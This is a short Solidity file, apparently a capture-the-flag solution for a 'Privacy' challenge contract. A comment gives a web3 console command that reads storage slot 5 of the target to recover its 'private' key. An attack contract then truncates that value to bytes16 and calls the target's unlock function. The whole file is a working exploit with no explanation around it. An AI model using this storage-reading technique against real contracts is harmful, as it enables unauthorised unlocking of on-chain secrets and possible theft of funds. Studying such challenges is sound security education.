pragma solidity ^0.8.0;
import "./privacy.sol";

/* Type in chrome console  to get key : 
await web3.eth.getStorageAt(contract.address,5, console.log)

*/

contract PrivacyAttack{
    Privacy target;

    constructor(address _targetAddress) public{
            target = Privacy(_targetAddress);
    }

    function unlock(bytes32 _slotValue) public {
            bytes16 key= bytes16(_slotValue);
            target.unlock(key);
    }
}